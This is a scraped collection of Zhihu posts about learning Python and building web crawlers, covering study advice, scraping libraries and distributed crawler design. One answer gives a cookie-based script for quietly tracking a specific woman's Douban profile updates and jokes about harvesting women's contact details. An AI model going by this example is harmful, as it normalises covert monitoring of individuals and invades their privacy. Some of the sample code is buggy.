data-original=\"https://pic3.zhimg.com/v2-4e64f07e6430ae1c59feca04d38055b2_r.jpg\"&gt;通过回顾用git版本控制工具记载下来的日志，以及版本对比功能，你可以清楚看到自己是在何时利用什么方法解决了这些问题。然后别忘了，给自己工具箱里的新增小技能打个勾。一个个小问题逐渐被你攻克的时候，你才能真正感受到所学技能的价值，并且点滴积累自信。讨论你学会Python了吗？你是用什么方法学会的？可否把你的学习心得体会分享给大家？对本文推荐的资源和路径，你有什么不同的意见，或者更好的建议？欢迎留言，记录下你的思考，我们一起交流讨论。喜欢请点赞。还可以微信关注和置顶我的公众号“玉树芝兰”(nkwangshuyi)。如果你对数据科学感兴趣，不妨阅读我的系列教程索引贴《如何高效入门数据科学？》，里面还有更多的有趣问题及解法。", "praise_num": 2633, "answer_object_id": "628614cf8bb13863ea26ce3f7823e170"},{"zhuanlan_id": 21332075, "zhuanlan_url": "https://zhuanlan.zhihu.com/p/21332075", "zhuanlan_title": "三天搞定Python", "praise_num": 10862, "zhuanlan_article": "知乎的各位朋友不好意思，前段时间因为给本科生带了一个Python的培训课程，每天弄得很累，所以没时间前来更新。也很感谢和欢迎猫兄@黑猫Q形态在我的专栏发文。我在学校带的Python课程主要是针对低年级的本科生，他们没有任何编程基础，很多人也没有学习很复杂的统计内容。因此我为他们量身订做了相应的课件，保持我的老风格，尽量以轻松简单的模式，把尽可能多的内容教给他们。我这里把我相应的课件以链接的形式和大家分享一下。因为在国外知乎的服务器经常很难登录，我尝试过在知乎上传课件图片，但最后都搞不好，因此只能给大家我微信公众号里的链接了。在这里跟大家说个抱歉。我的课件内容主要总共三份，这些课件我参考了很多的资料，有网上资源，也有一些教材，然后自己整理出来的，针对本科生和零基础的人设计的。所以高手们可以忽略的自然。不说多了，所有内容都在下边这三个链接里：三天搞定Python基础功，Day 1基础篇三天搞定Python基础功，Day 1基础篇三天搞定Python基本功，Day 2科学计算篇三天搞定Python基本功，Day 2科学计算篇三天搞定Python基础功，Day 3统计入门篇三天搞定Python基础功，Day 3统计入门篇希望能对没有接触过编程，或者没有接触过Python的朋友有个参考。", "comments_num": 447, "zhuanlan_object_id": "cdcda9e266c596967fe8433ad11f4878"},{"answer_url": "https://www.zhihu.com/question/20899988/answer/58388759", "answer_id": 58388759, "comments_num": 107, "answer_article": "看了大部分回答不禁叹口气，主要是因为看到很多大牛在回答像“如何入门爬虫”这种问题的时候，一如当年学霸讲解题目，跳步无数，然后留下一句“不就是这样推嘛”，让一众小白菜鸟一脸懵逼。。作为一个0起步（之前连python都不会），目前总算掌握基础，开始向上进阶的菜鸟，深知其中的不易，所以我会在这个回答里，尽可能全面、细节地分享给大家从0学习爬虫的各种步骤，如果对你有帮助，请点赞~-------------------------------------------------------------------------------------------------#我要写爬虫！ #Ver.1.2  #Based on: Python 2.7#Author:高野良#原创内容，转载请注明出处首先！你要对爬虫有个明确的认识，这里引用毛主席的思想：&lt;img src=\"https://pic4.zhimg.com/4098627230457e1171b9ec2051772837_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"164\" data-rawheight=\"220\" class=\"content_image\" width=\"164\"&gt;在战略上藐视： “所有网站皆可爬”：互联网的内容都是人写出来的，而且都是偷懒写出来的（不会第一页是a，下一页是8），所以肯定有规律，这就给人有了爬取的可能，可以说，天下没有不能爬的网站“框架不变”：网站不同，但是原理都类似，大部分爬虫都是从 发送请求——获得页面——解析页面——下载内容——储存内容 这样的流程来进行，只是用的工具不同在战术上重视： 持之以恒，戒骄戒躁：对于初学入门，不可轻易自满，以为爬了一点内容就什么都会爬了，爬虫虽然是比较简单的技术，但是往深学也是没有止境的（比如搜索引擎等）！只有不断尝试，刻苦钻研才是王道！（为何有种小学作文即视感）                              ||                                ||                                V然后，你需要一个宏伟的目标，来让你有持续学习的动力（没有实操项目，真的很难有动力）我要爬整个豆瓣！...我要爬整个草榴社区！我要爬知乎各种妹子的联系方式*&amp;^#%^$#&lt;img src=\"https://pic4.zhimg.com/9264555e01047baf9f88b1919d21c5ab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"580\" data-rawheight=\"287\" class=\"origin_image zh-lightbox-thumb\" width=\"580\" data-original=\"https://pic4.zhimg.com/9264555e01047baf9f88b1919d21c5ab_r.jpg\"&gt;                              ||                                ||                                V接着，你需要扪心自问一下，自己的python基本功吼不吼啊？吼啊！——OK，开始欢快地学习爬虫吧 ！不吼？你还需要学习一个！赶紧回去看廖雪峰老师的教程，2.7的。至少这些功能和语法你要有基本的掌握 ：list，dict：用来序列化你爬的东西切片：用来对爬取的内容进行分割，生成条件判断（if等）：用来解决爬虫过程中哪些要哪些不要的问题循环和迭代（for while ）：用来循环，重复爬虫动作文件读写操作（open，close等）：用来读取参数、保存爬下来的内容等编码常识（codecs等）：非常关键，爬虫写熟了以后遇到的各种古怪问题，很多来自于UTF-8 GBK等奇奇怪怪的编码！这个问题先做了解，后面调试时候再解决也不迟！                              ||                                ||                                V然后，你需要补充一下下面几个内容，作为你的知识储备：（注：这里并非要求“掌握”，下面讲的两点，只需要先了解，然后通过具体项目来不断实践，直到熟练掌握）1、网页的基本知识：基本的HTML语言知识（知道href等大学计算机一级内容即可）理解网站的发包和收包的概念（POST GET）稍微一点点的js知识，用于理解动态网页（当然如果本身就懂当然更好啦）2、一些分析语言，为接下来解析网页内容做准备NO.1  正则表达式：扛把子技术，总得会最基础的：&lt;img src=\"https://pic3.zhimg.com/69c995e57e29ab383d0717211e8f1c8e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"799\" data-rawheight=\"1719\" class=\"origin_image zh-lightbox-thumb\" width=\"799\" data-original=\"https://pic3.zhimg.com/69c995e57e29ab383d0717211e8f1c8e_r.jpg\"&gt;NO.2  XPATH：高效的分析语言，表达清晰简单，掌握了以后基本可以不用正则参考：XPath 教程 &lt;img src=\"https://pic3.zhimg.com/83020a6e8bfc4d3c38f7c36377da0d46_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"612\" data-rawheight=\"255\" class=\"origin_image zh-lightbox-thumb\" width=\"612\" data-original=\"https://pic3.zhimg.com/83020a6e8bfc4d3c38f7c36377da0d46_r.jpg\"&gt;NO.3  Beautifulsoup：美丽汤模块解析网页神器,一款神器，如果不用一些爬虫框架（如后文讲到的scrapy），配合request，urllib等模块（后面会详细讲），可以编写各种小巧精干的爬虫脚本官网文档：Beautiful Soup 4.2.0 文档 参考案例： &lt;img src=\"https://pic4.zhimg.com/5d5b7de4dcaf69fa89ab4f5ef8bdbf3f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"734\" data-rawheight=\"267\" class=\"origin_image zh-lightbox-thumb\" width=\"734\" data-original=\"https://pic4.zhimg.com/5d5b7de4dcaf69fa89ab4f5ef8bdbf3f_r.jpg\"&gt;&lt;img src=\"https://pic3.zhimg.com/4a1f7a23745479544a88a42f20748856_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"737\" data-rawheight=\"551\" class=\"origin_image zh-lightbox-thumb\" width=\"737\" data-original=\"https://pic3.zhimg.com/4a1f7a23745479544a88a42f20748856_r.jpg\"&gt;                              ||                              ||                              V接着，你需要一些高效的工具来辅助（同样，这里先了解，到具体的项目的时候，再熟悉运用）NO.1   F12 开发者工具： 看源代码：快速定位元素分析xpath：1、此处建议谷歌系浏览器,可以在源码界面直接右键看&lt;img src=\"https://pic3.zhimg.com/8be689bc054b6fc2077feca4b99d056e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"861\" data-rawheight=\"449\" class=\"origin_image zh-lightbox-thumb\" width=\"861\" data-original=\"https://pic3.zhimg.com/8be689bc054b6fc2077feca4b99d056e_r.jpg\"&gt;NO.2  抓包工具： 推荐httpfox，火狐浏览器下的插件,比谷歌火狐系自带的F12工具都要好，可以方便查看网站收包发包的信息&lt;img src=\"https://pic1.zhimg.com/e1c9d44b06a3b9d199c62f0c0e84c3b8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"893\" data-rawheight=\"627\" class=\"origin_image zh-lightbox-thumb\" width=\"893\" data-original=\"https://pic1.zhimg.com/e1c9d44b06a3b9d199c62f0c0e84c3b8_r.jpg\"&gt;NO.3  XPATH CHECKER (火狐插件）：非常不错的xpath测试工具，但是有几个坑，都是个人踩过的，，在此告诫大家：     1、xpath checker生成的是绝对路径，遇到一些动态生成的图标（常见的有列表翻页按钮等），飘忽不定的绝对路径很有可能造成错误，所以这里建议在真正分析的时候，只是作为参考     2、记得把如下图xpath框里的“x:”去掉，貌似这个是早期版本xpath的语法，目前已经和一些模块不兼容（比如scrapy），还是删去避免报错&lt;img src=\"https://pic1.zhimg.com/87c0ab00e3397e0bf8418b0fd693c298_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"408\" class=\"origin_image zh-lightbox-thumb\" width=\"700\" data-original=\"https://pic1.zhimg.com/87c0ab00e3397e0bf8418b0fd693c298_r.jpg\"&gt;NO.4  正则表达测试工具： 在线正则表达式测试 ，拿来多练练手，也辅助分析！里面有很多现成的正则表达式可以用，也可以进行参考！                              ||                              ||                              Vok！这些你都基本有一些了解了，现在开始进入抓取时间，上各种模块吧！python的火，很大原因就是各种好用的模块，这些模块是居家旅行爬网站常备的——urlliburllib2requests                              ||                              ||                              V不想重复造轮子，有没有现成的框架？华丽丽的scrapy(这块我会重点讲，我的最爱）||||V遇到动态页面怎么办？selenium（会了这个配合scrapy无往不利，是居家旅行爬网站又一神器，下一版更新的时候会着重安利，因为这块貌似目前网上的教程还很少）phantomJS（不显示网页的selenium）||||V遇到反爬虫策略验证码之类咋整？（不想折腾的直接第四个）PILopencvpybrain打码平台||||V然后是数据库，这里我认为开始并不需要非常深入，在需要的时候再学习即可mysqlmongodbsqllite||||V爬来的东西怎么用？numpy 数据分析，类似matlab的模块pandas（基于numpy的数据分析模块，相信我，如果你不是专门搞TB级数据的，这个就够了）||||V进阶技术多线程、分布式———————————— 乱入的分割线 —————————————然后学习编程关键的是学以致用，天天捧一本书看不如直接上手操练，下面我通过实际的例子来讲解爬虫——比如最近，楼主在豆瓣上认识了一个很可爱的妹子，发现她一直会更新签名和日志，所以没事就会去她主页看看，但一直没有互相加好友（作为一只高冷的天蝎，怎么可以轻易加好友嘛！而且加了好友，你更新什么都会收到推送，那多没意思啊！一点神秘感都没有了！），可还是想及时获得妹子的最新动态，怎么办？&lt;img src=\"https://pic2.zhimg.com/dd6fd1c0cb91ebad9bacd7d11a56bd09_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"400\" class=\"content_image\" width=\"400\"&gt;于是我就写了个70几行的python脚本，包含爬虫+邮件模块，跑在家里的一台闲置笔记本上，通过计划任务每准点抓取妹子的签名和最新文章一次，发送到我的邮箱。。嗯，其实是很简单的技术，，代码如下所示：#-*-coding:utf-8-*- #编码声明，不要忘记！\nimport requests  #这里使用requests，小脚本用它最合适！\nfrom lxml import html    #这里我们用lxml，也就是xpath的方法\n\n#豆瓣模拟登录，最简单的是cookie，会这个方法，80%的登录网站可以搞定\ncookie = {} \n\nraw_cookies = ''#引号里面是你的cookie，用之前讲的抓包工具来获得\n\nfor line in raw_cookies.split(';'):\n    key,value = line.split(\"=\", 1)\n    cookie[key] = value #一些格式化操作，用来装载cookies\n\n#重点来了！用requests，装载cookies，请求网站\npage = requests.get('#妹纸的豆瓣主页#',cookies=cookie)\n\n#对获取到的page格式化操作，方便后面用XPath来解析\ntree = html.fromstring(page.text)\n\n#XPath解析，获得你要的文字段落！\nintro_raw = tree.xpath('//span[@id=\"intro_display\"]/text()')\n\n#简单的转码工作，这步根据需要可以省略\nfor i in intro_raw:\n    intro = i.encode('utf-8')\n\nprint intro #妹子的签名就显示在屏幕上啦\n\n#接下来就是装载邮件模块，因为与本问题关联不大就不赘述啦~\n怎么样~是不是很简单~V1.2更新日志：\n修改了一些细节和内容顺序\n", "praise_num": 2928, "answer_object_id": "3f421054b76d36ffaf4f131694b95ac8"},{"answer_url": "https://www.zhihu.com/question/20899988/answer/24923424", "answer_id": 24923424, "comments_num": 284, "answer_article": "“入门”是良好的动机，但是可能作用缓慢。如果你手里或者脑子里有一个项目，那么实践起来你会被目标驱动，而不会像学习模块一样慢慢学习。另外如果说知识体系里的每一个知识点是图里的点，依赖关系是边的话，那么这个图一定不是一个有向无环图。因为学习A的经验可以帮助你学习B。因此，你不需要学习怎么样“入门”，因为这样的“入门”点根本不存在！你需要学习的是怎么样做一个比较大的东西，在这个过程中，你会很快地学会需要学会的东西的。当然，你可以争论说需要先懂python，不然怎么学会python做爬虫呢？但是事实上，你完全可以在做这个爬虫的过程中学习python :D看到前面很多答案都讲的“术”——用什么软件怎么爬，那我就讲讲“道”和“术”吧——爬虫怎么工作以及怎么在python实现。先长话短说summarize一下：你需要学习基本的爬虫工作原理基本的http抓取工具，scrapyBloom Filter: Bloom Filters by Example如果需要大规模网页抓取，你需要学习分布式爬虫的概念。其实没那么玄乎，你只要学会怎样维护一个所有集群机器能够有效分享的分布式队列就好。最简单的实现是python-rq: https://github.com/nvie/rqrq和Scrapy的结合：darkrho/scrapy-redis · GitHub后续处理，网页析取(grangier/python-goose · GitHub)，存储(Mongodb)以下是短话长说：说说当初写的一个集群爬下整个豆瓣的经验吧。1）首先你要明白爬虫怎样工作。想象你是一只蜘蛛，现在你被放到了互联“网”上。那么，你需要把所有的网页都看一遍。怎么办呢？没问题呀，你就随便从某个地方开始，比如说人民日报的首页，这个叫initial pages，用$表示吧。在人民日报的首页，你看到那个页面引向的各种链接。于是你很开心地从爬到了“国内新闻”那个页面。太好了，这样你就已经爬完了俩页面（首页和国内新闻）！暂且不用管爬下来的页面怎么处理的，你就想象你把这个页面完完整整抄成了个html放到了你身上。突然你发现， 在国内新闻这个页面上，有一个链接链回“首页”。作为一只聪明的蜘蛛，你肯定知道你不用爬回去的吧，因为你已经看过了啊。所以，你需要用你的脑子，存下你已经看过的页面地址。这样，每次看到一个可能需要爬的新链接，你就先查查你脑子里是不是已经去过这个页面地址。如果去过，那就别去了。好的，理论上如果所有的页面可以从initial page达到的话，那么可以证明你一定可以爬完所有的网页。那么在python里怎么实现呢？很简单import Queue\n\ninitial_page = \"http://www.renminribao.com\"\n\nurl_queue = Queue.Queue()\nseen = set()\n\nseen.insert(initial_page)\nurl_queue.put(initial_page)\n\nwhile(True): #一直进行直到海枯石烂\n    if url_queue.size()&gt;0:\n        current_url = url_queue.get()    #拿出队例中第一个的url\n        store(current_url)               #把这个url代表的网页存储好\n        for next_url in extract_urls(current_url): #提取把这个url里链向的url\n            if next_url not in seen:      \n                seen.put(next_url)\n                url_queue.put(next_url)\n    else:\n        break\n写得已经很伪代码了。所有的爬虫的backbone都在这里，下面分析一下为什么爬虫事实上是个非常复杂的东西——搜索引擎公司通常有一整个团队来维护和开发。2）效率如果你直接加工一下上面的代码直接运行的话，你需要一整年才能爬下整个豆瓣的内容。更别说Google这样的搜索引擎需要爬下全网的内容了。问题出在哪呢？需要爬的网页实在太多太多了，而上面的代码太慢太慢了。设想全网有N个网站，那么分析一下判重的复杂度就是N*log(N)，因为所有网页要遍历一次，而每次判重用set的话需要log(N)的复杂度。OK，OK，我知道python的set实现是hash——不过这样还是太慢了，至少内存使用效率不高。通常的判重做法是怎样呢？Bloom Filter. 简单讲它仍然是一种hash的方法，但是它的特点是，它可以使用固定的内存（不随url的数量而增长）以O(1)的效率判定url是否已经在set中。可惜天下没有白吃的午餐，它的唯一问题在于，如果这个url不在set中，BF可以100%确定这个url没有看过。但是如果这个url在set中，它会告诉你：这个url应该已经出现过，不过我有2%的不确定性。注意这里的不确定性在你分配的内存足够大的时候，可以变得很小很少。一个简单的教程:Bloom Filters by Example注意到这个特点，url如果被看过，那么可能以小概率重复看一看（没关系，多看看不会累死）。但是如果没被看过，一定会被看一下（这个很重要，不然我们就要漏掉一些网页了！）。 [IMPORTANT: 此段有问题，请暂时略过]好，现在已经接近处理判重最快的方法了。另外一个瓶颈——你只有一台机器。不管你的带宽有多大，只要你的机器下载网页的速度是瓶颈的话，那么你只有加快这个速度。用一台机子不够的话——用很多台吧！当然，我们假设每台机子都已经进了最大的效率——使用多线程（python的话，多进程吧）。3）集群化抓取爬取豆瓣的时候，我总共用了100多台机器昼夜不停地运行了一个月。想象如果只用一台机子你就得运行100个月了...那么，假设你现在有100台机器可以用，怎么用python实现一个分布式的爬取算法呢？我们把这100台中的99台运算能力较小的机器叫作slave，另外一台较大的机器叫作master，那么回顾上面代码中的url_queue，如果我们能把这个queue放到这台master机器上，所有的slave都可以通过网络跟master联通，每当一个slave完成下载一个网页，就向master请求一个新的网页来抓取。而每次slave新抓到一个网页，就把这个网页上所有的链接送到master的queue里去。同样，bloom filter也放到master上，但是现在master只发送确定没有被访问过的url给slave。Bloom Filter放到master的内存里，而被访问过的url放到运行在master上的Redis里，这样保证所有操作都是O(1)。（至少平摊是O(1)，Redis的访问效率见:LINSERT – Redis)考虑如何用python实现：在各台slave上装好scrapy，那么各台机子就变成了一台有抓取能力的slave，在master上装好Redis和rq用作分布式队列。代码于是写成#slave.py\n\ncurrent_url = request_from_master()\nto_send = []\nfor next_url in extract_urls(current_url):\n    to_send.append(next_url)\n\nstore(current_url);\nsend_to_master(to_send)\n\n#master.py\ndistributed_queue = DistributedQueue()\nbf = BloomFilter()\n\ninitial_pages = \"www.renmingribao.com\"\n\nwhile(True):\n    if request == 'GET':\n        if distributed_queue.size()&gt;0:\n            send(distributed_queue.get())\n        else:\n            break\n    elif request == 'POST':\n        bf.put(request.url)\n        \n好的，其实你能想到，有人已经给你写好了你需要的：darkrho/scrapy-redis · GitHub4）展望及后处理虽然上面用很多“简单”，但是真正要实现一个商业规模可用的爬虫并不是一件容易的事。上面的代码用来爬一个整体的网站几乎没有太大的问题。但是如果附加上你需要这些后续处理，比如有效地存储（数据库应该怎样安排）有效地判重（这里指网页判重，咱可不想把人民日报和抄袭它的大民日报都爬一遍）有效地信息抽取（比如怎么样抽取出网页上所有的地址抽取出来，“朝阳区奋进路中华道”），搜索引擎通常不需要存储所有的信息，比如图片我存来干嘛...及时更新（预测这个网页多久会更新一次）如你所想，这里每一个点都可以供很多研究者十数年的研究。虽然如此，“路漫漫其修远兮,吾将上下而求索”。所以，不要问怎么入门，直接上路就好了：）", "praise_num": 12974, "answer_object_id": "e122940ecd7e9e2de4e2e177790bc6af"},{"answer_url": "https://www.zhihu.com/question/29138020/answer/72193349", "answer_id": 72193349, "comments_num": 112, "answer_article": "是否非常想学好 Python，一方面被琐事纠缠，一直没能动手，另一方面，担心学习成本太高，心里默默敲着退堂鼓？幸运的是，Python 是一门初学者友好的编程语言，想要完全掌握它，你不必花上太多的时间和精力。Python 的设计哲学之一就是简单易学，体现在两个方面：语法简洁明了：相对 Ruby 和 Perl，它的语法特性不多不少，大多数都很简单直接，不玩儿玄学。切入点很多：Python 可以让你可以做很多事情，科学计算和数据分析、爬虫、Web 网站、游戏、命令行实用工具等等等等，总有一个是你感兴趣并且愿意投入时间的。废话不多说，学会一门语言的捷径只有一个： Getting Started¶ 起步阶段任何一种编程语言都包含两个部分：硬知识和软知识，起步阶段的主要任务是掌握硬知识。°1 硬知识“硬知识”指的是编程语言的语法、算法和数据结构、编程范式等，例如：变量和类型、循环语句、分支、函数、类。这部分知识也是具有普适性的，看上去是掌握了一种语法，实际是建立了一种思维。例如：让一个 Java 程序员去学习 Python，他可以很快的将 Java 中的学到的面向对象的知识 map 到 Python 中来，因此能够快速掌握 Python 中面向对象的特性。如果你是刚开始学习编程的新手，一本可靠的语法书是非常重要的。它看上去可能非常枯燥乏味，但对于建立稳固的编程思维是必不可少。下面列出了一些适合初学者入门的教学材料：❖「笨方法学 Python」：http://learnpythonthehardway.org/book/这本书在讲解 Python 的语法成分时，还附带大量可实践的例子，非常适合快速起步。❖「廖雪峰的 Python 2.7 教程」：Home - 廖雪峰的官方网站Python 中文教程的翘楚，专为刚刚步入程序世界的小白打造。❖「The Hitchhiker’s Guide to Python!」：The Hitchhiker’s Guide to Python!这本指南着重于 Python 的最佳实践，不管你是 Python 专家还是新手，都能获得极大的帮助。❖「Python 官方文档」：Our Documentation实践中大部分问题，都可以在官方文档中找到答案。❖ 辅助工具：Python Tutor一个 Python 对象可视化的项目，用图形辅助你理解 Python 中的各种概念。Python 的哲学：用一种方法，最好是只有一种方法来做一件事。学习也是一样，虽然推荐了多种学习资料，但实际学习的时候，最好只选择其中的一个，坚持看完。必要的时候，可能需要阅读讲解数据结构和算法的书，这些知识对于理解和使用 Python 中的对象模型有着很大的帮助。°2 软知识“软知识”则是特定语言环境下的语法技巧、类库的使用、IDE的选择等等。这一部分，即使完全不了解不会使用，也不会妨碍你去编程，只不过写出的程序，看上去显得“傻”了些。对这些知识的学习，取决于你尝试解决的问题的领域和深度。对初学者而言，起步阶段极易走火，或者在选择 Python 版本时徘徊不决，一会儿看 2.7 一会儿又转到 3.0，或者徜徉在类库的大海中无法自拔，Scrapy，Numpy，Django 什么都要试试，或者参与编辑器圣战、大括号缩进探究、操作系统辩论赛等无意义活动，或者整天跪舔语法糖，老想着怎么一行代码把所有的事情做完，或者去构想圣洁的性能安全通用性健壮性全部满分的解决方案。很多“大牛”都会告诫初学者，用这个用那个，少走弯路，这样反而把初学者推向了真正的弯路。还不如告诉初学者，学习本来就是个需要你去走弯路出 Bug，只能脚踏实地，没有奇迹只有狗屎的过程。选择一个方向先走下去，哪怕脏丑差，走不动了再看看有没有更好的解决途径。自己走了弯路，你才知道这么做的好处，才能理解为什么人们可以手写状态机去匹配却偏要发明正则表达式，为什么面向过程可以解决却偏要面向对象，为什么我可以操纵每一根指针却偏要自动管理内存，为什么我可以嵌套回调却偏要用 Promise...更重要的时，你会明白，高层次的解决方法都是对低层次的封装，并不是任何情况下都是最有效最合适的。技术涌进就像波浪一样，那些陈旧的封存已久的技术，消退了迟早还会涌回的。就像现在移动端应用、手游和 HTML5 的火热，某些方面不正在重演过去 PC 的那些历史么？因此，不要担心自己走错路误了终身，坚持并保持进步才是正道。起步阶段的核心任务是掌握硬知识，软知识做适当了解，有了稳固的根，粗壮的枝干，才能长出浓密的叶子，结出甜美的果实。¶ 发展阶段完成了基础知识的学习，必定会感到一阵空虚，怀疑这些语法知识是不是真的有用。没错，你的怀疑是非常正确的。要让 Python 发挥出它的价值，当然不能停留在语法层面。发展阶段的核心任务，就是“跳出 Python，拥抱世界”。在你面前会有多个分支：科学计算和数据分析、爬虫、Web 网站、游戏、命令行实用工具等等等等，这些都不是仅仅知道 Python 语法就能解决的问题。拿爬虫举例，如果你对计算机网络，HTTP协议，HTML，文本编码，JSON一无所知，你能做好这部分的工作么？而你在起步阶段的基础知识也同样重要，如果你连循环递归怎么写都还要查文档，连 BFS 都不知道怎么实现，这就像工匠做石凳每次起锤都要思考锤子怎么使用一样，非常低效。在这个阶段，不可避免要接触大量类库，阅读大量书籍的。°1 类库方面「Awesome Python 项目」：vinta/awesome-python · GitHub这里列出了你在尝试解决各种实际问题时，Python 社区已有的工具型类库，如下图所示：&lt;img src=\"https://pic1.zhimg.com/6c1f92cc8dcafe556369c272346852c8_b.png\" data-rawwidth=\"1454\" data-rawheight=\"1348\" class=\"origin_image zh-lightbox-thumb\" width=\"1454\" data-original=\"https://pic1.zhimg.com/6c1f92cc8dcafe556369c272346852c8_r.jpg\"&gt;你可以按照实际需求，寻找你需要的类库。至于相关类库如何使用，必须掌握的技能便是阅读文档。由于开源社区大多数文档都是英文写成的，所以，英语不好的同学，需要恶补下。°2 书籍方面：这里我只列出一些我觉得比较有一些帮助的书籍，详细的请看豆瓣的书评：科学和数据分析：❖「集体智慧编程」：集体智慧编程 (豆瓣)❖「数学之美」：数学之美 (豆瓣)❖「统计学习方法」：统计学习方法 (豆瓣)❖「Pattern Recognition And Machine Learning」：Pattern Recognition And Machine Learning (豆瓣)❖「数据科学实战」：数据科学实战 (豆瓣)❖「数据检索导论」：信息检索导论 (豆瓣)爬虫：❖「HTTP 权威指南」：HTTP权威指南 (豆瓣)Web 网站：❖「HTML &amp; CSS 设计与构建网站」：HTML &amp; CSS设计与构建网站 (豆瓣)... 列到这里已经不需要继续了。聪明的你一定会发现上面的大部分书籍，并不是讲 Python 的书，而更多的是专业知识。事实上，这里所谓“跳出 Python，拥抱世界”，其实是发现 Python 和专业知识相结合，能够解决很多实际问题。这个阶段能走到什么程度，更多的取决于自己的专业知识。¶ 深入阶段这个阶段的你，对 Python 几乎了如指掌，那么你一定知道 Python 是用 C 语言实现的。可是 Python 对象的“动态特征”是怎么用相对底层，连自动内存管理都没有的C语言实现的呢？这时候就不能停留在表面了，勇敢的拆开 Python 的黑盒子，深入到语言的内部，去看它的历史，读它的源码，才能真正理解它的设计思路。这里推荐一本书：「Python 源码剖析」：Python源码剖析 (豆瓣)这本书把 Python 源码中最核心的部分，给出了详细的阐释，不过阅读此书需要对 C 语言内存模型和指针有着很好的理解。另外，Python 本身是一门杂糅多种范式的动态语言，也就是说，相对于 C 的过程式、 Haskell 等的函数式、Java 基于类的面向对象而言，它都不够纯粹。换而言之，编程语言的“道学”，在 Python 中只能有限的体悟。学习某种编程范式时，从那些面向这种范式更加纯粹的语言出发，才能有更深刻的理解，也能了解到 Python 语言的根源。这里推荐一门公开课「编程范式」：斯坦福大学公开课：编程范式讲师高屋建瓴，从各种编程范式的代表语言出发，给出了每种编程范式最核心的思想。值得一提的是，这门课程对C语言有非常深入的讲解，例如C语言的范型和内存管理。这些知识，对阅读 Python 源码也有大有帮助。Python 的许多最佳实践都隐藏在那些众所周知的框架和类库中，例如 Django、Tornado 等等。在它们的源代码中淘金，也是个不错的选择。¶  最后的话每个人学编程的道路都是不一样的，其实大都殊途同归，没有迷路的人只有不能坚持的人。虽然听上去有点鸡汤，但是这是事实。希望想学 Python 想学编程的同学，不要犹豫了，看完这篇文章，Just getting started～另外，欢迎私信本喵交流 Python 的学习经验哦 &gt; .&lt;", "praise_num": 5378, "answer_object_id": "8c6ab5ee001b48265be3999434fc55c2"},{"zhuanlan_id": 21479334, "zhuanlan_url": "https://zhuanlan.zhihu.com/p/21479334", "zhuanlan_title": "如何学习Python爬虫[入门篇]？", "praise_num": 8784, "zhuanlan_article": "这篇文章已经过去很久了，有一些学习资源链接已经失效了，还一直有小伙伴在Python的路上摸索。所以我根据自己的学习和工作经历整理了一套Python学习电子书，在公众号「一个程序员的日常」后台回复关键词「1」可以免费获得！想写这么一篇文章，但是知乎社区爬虫大神很多，光是整理他们的答案就够我这篇文章的内容了。对于我个人来说我更喜欢那种非常实用的教程，这种教程对于想直接上手爬虫做一些小东西的朋友来说是极好的。用一个精彩的回答作为开头：如何入门 Python 爬虫？ - 谢科的回答如果你想学习编程，但是找不到学习路径和资源，欢迎关注专栏：学习编程 &lt;img src=\"https://pic2.zhimg.com/362c4788a778b0ea008828352d1905ba_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"80\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" data-original=\"https://pic2.zhimg.com/362c4788a778b0ea008828352d1905ba_r.jpg\"&gt;第一：Python爬虫学习系列教程（来源于某博主：http://cuiqingcai.com/1052.html）Python版本：2.7 整体目录： 一、爬虫入门1. Python爬虫入门一之综述2. Python爬虫入门二之爬虫基础了解3. Python爬虫入门三之Urllib库的基本使用4. Python爬虫入门四之Urllib库的高级用法5. Python爬虫入门五之URLError异常处理6. Python爬虫入门六之Cookie的使用7. Python爬虫入门七之正则表达式二、爬虫实战1. Python爬虫实战一之爬取糗事百科段子2. Python爬虫实战二之爬取百度贴吧帖子3. Python爬虫实战三之实现山东大学无线网络掉线自动重连4. Python爬虫实战四之抓取淘宝MM照片5. Python爬虫实战五之模拟登录淘宝并获取所有订单6. Python爬虫实战六之抓取爱问知识人问题并保存至数据库7. Python爬虫实战七之计算大学本学期绩点8. Python爬虫实战八之利用Selenium抓取淘宝匿名旺旺三、爬虫利器1. Python爬虫利器一之Requests库的用法2. Python爬虫利器二之Beautiful Soup的用法3. Python爬虫利器三之Xpath语法与lxml库的用法4. Python爬虫利器四之PhantomJS的用法5. Python爬虫利器五之Selenium的用法6. Python爬虫利器六之PyQuery的用法四、爬虫进阶1. Python爬虫进阶一之爬虫框架概述2. Python爬虫进阶二之PySpider框架安装配置3. Python爬虫进阶三之爬虫框架Scrapy安装配置4. Python爬虫进阶四之PySpider的用法&lt;img src=\"https://pic4.zhimg.com/cb1988827eb53002ebb9d3ac9864d197_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"80\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" 